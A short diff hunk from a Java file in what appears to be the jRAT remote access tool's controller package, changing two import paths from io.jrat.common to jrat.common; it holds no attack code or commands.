@@ -1,7 +1,7 @@
 package jrat.controller.packets.incoming;
 
-import io.jrat.common.Logger;
-import io.jrat.common.utils.JarUtils;
+import jrat.common.Logger;
+import jrat.common.utils.JarUtils;
 import jrat.controller.Globals;
 import jrat.controller.OfflineSlave;
 import jrat.controller.Slave;
